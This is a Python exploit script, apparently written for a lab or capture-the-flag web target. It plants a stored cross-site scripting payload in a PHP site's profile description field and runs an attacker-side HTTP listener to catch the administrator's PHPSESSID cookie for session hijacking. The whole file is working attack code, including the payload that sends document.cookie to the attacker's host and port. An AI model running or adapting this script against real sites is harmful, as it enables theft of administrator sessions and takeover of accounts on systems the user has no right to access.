#!/usr/bin/env python3

import argparse
import traceback
import requests
import http.server
import socketserver
import threading
import time
import sys
import os
import signal
from urllib.parse import urlparse, parse_qs, urljoin

# Global variables
admin_token_received = False
server_running = False

class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global admin_token_received

        if self.path.startswith('/token?PHPSESSID='):
            try:
                parsed_url = urlparse(self.path)
                query_params = parse_qs(parsed_url.query)
                admin_token = query_params.get('PHPSESSID', [''])[0]

                if admin_token:
                    print(f"\n[+] Admin session received: {admin_token}")

                    with open("admin_token.txt", "w", encoding="utf-8") as f:
                        f.write(admin_token)

                    admin_token_received = True

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b'Session received successfully!')
                else:
                    print("[-] Empty admin session received")
                    self.send_error(400, "Empty session")

            except Exception as e:
                print(f"[-] Error processing session: {e}")
                self.send_error(500, "Server error")
        else:
            super().do_GET()


def start_http_server(port=1337, timeout=300): # server port
    global server_running
    try:
        with socketserver.TCPServer(("", port), TokenHandler) as httpd:
            server_running = True
            print(f"[+] HTTP Server started on port {port}")
            print(f"[+] Waiting for admin token (timeout: {timeout}s)...")

            httpd.timeout = 1
            start_time = time.time()

            while server_running and (time.time() - start_time) < timeout:
                httpd.handle_request()
                if admin_token_received:
                    print("[+] Token received, shutting down server")
                    break

            if not admin_token_received:
                print(f"[-] Timeout reached ({timeout}s), no token received")

    except PermissionError:
        print(f"[-] Permission denied for port {port}. Try running as root/administrator")
    except OSError as e:
        if e.errno == 98:
            print(f"[-] Port {port} is already in use")
        else:
            print(f"[-] Error starting HTTP server: {e}")
    except Exception as e:
        print(f"[-] Unexpected server error: {e}")
    finally:
        server_running = False

def deliverXss(target, lhost, nrmlUsrSession, server_port = 1337):
    xssUrl = urljoin(target, "profile.php")
    cookies = {"PHPSESSID": nrmlUsrSession}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    xssPayload = f"'\"><script>document.write('<img src=http://{lhost}:{server_port}/token?'+document.cookie+' />');</script>"
    xssData = {"description": f"{xssPayload}"}
    try:
        xssRes = requests.post(xssUrl, headers=headers, cookies=cookies, data=xssData)
        if "Success" in xssRes.text:
            print("[+] XSS Payload Delivered Successfully")
        else:
            print("[-] Failed to deliver the XSS payload")
    except Exception as e:
        print("[-] Error updating the account description: ", e)
        traceback.print_exc()

def xssExp(target, lhost, normal_user_session_cookie, server_port=1337):
    server_thread = threading.Thread(target=start_http_server, args=(server_port, 300), daemon=True)
    server_thread.start()

    while not server_running:
        time.sleep(0.1)

    deliverXss(target, lhost, normal_user_session_cookie) # Send XSS payload 

    print("[+] Waiting for admin session...")

    timeout = 300
    start_time = time.time()

    while time.time() - start_time < timeout and not admin_token_received:
        time.sleep(1)

    if admin_token_received:
        print("[+] Admin session successfully exfiltrated!")
        return True
    else:
        print("[-] Timeout waiting for admin token")
        return False

def signal_handler(sig, frame):
    global server_running
    print("\n[*] Shutting down...")
    server_running = False
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="Exploit the XSS to Hijack Admin's Session Cookie.")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("normal_user_session", help='Normal user session (e.g, `user1` or `user2`)')

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    norml_user_session = args.normal_user_session
    try:
        success = xssExp(args.target, args.lhost, norml_user_session)

        if success:
            print("[+] Exploit completed successfully!")
            if os.path.exists("admin_token.txt"):
                with open("admin_token.txt", "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    print(content)
                    adminSession = content.split(";")[0]  # Take the first part before the semicolon
                    print(f"[+] Admin token saved to admin_token.txt: {adminSession}")
            return 0
        else:
            print("[-] Exploit failed")
            return 1
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
